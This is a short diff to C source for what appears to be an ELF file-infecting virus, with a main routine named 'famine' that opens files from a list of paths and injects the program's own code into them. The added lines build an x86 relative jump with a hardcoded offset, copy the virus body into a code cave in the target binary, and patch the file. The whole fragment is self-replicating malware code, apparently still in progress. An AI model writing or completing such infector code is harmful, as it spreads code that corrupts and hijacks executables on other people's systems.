@@ -58,21 +58,35 @@ int	calculate_jmp(t_data *data, size_t payload_size) {
 
 	return 0;
 }
+
+void modify_jmp(char *jmp, int64_t value) {
+	for (size_t i = 4; i > 0; i--) {
+		jmp[4 - i] = value & 0xFF;
+		value >>= 8;
+	}
+}
 	
 
 int	inject(t_data *data) {
 
 	//char *text = text_section(data);
+	//
+	char jmp[] = "\xe9\x00\x00\x00\x00";
 	
 	unsigned long size =  (char *)&end - (char *)&_start;
 
 	silvio(data, size);
 
-	//calculate_jmp(data, g_payload_size);
+	data->cave.rel_jmp = -42 - 6;
+
+
+	modify_jmp(jmp + 1, data->cave.rel_jmp);
 	//
 	//modify_payload(data->cave.rel_jmp, JMP_OFFSET, sizeof(data->cave.rel_jmp), (uint8_t *)g_payload, g_payload_size);
 
 	ft_memcpy(data->file + data->cave.offset, _start, size);
+
+	ft_memcpy(data->file + data->cave.offset + 6, jmp, sizeof(jmp));
 
 	patch_new_file(data);
 
@@ -145,5 +159,7 @@ void	famine(void)
 
 	for (int i = 0; paths[i]; i++)
 		open_file(paths[i]);
+
+	//__asm__ volatile ("syscall" : : "a" (60) : "rdi");
 
 }
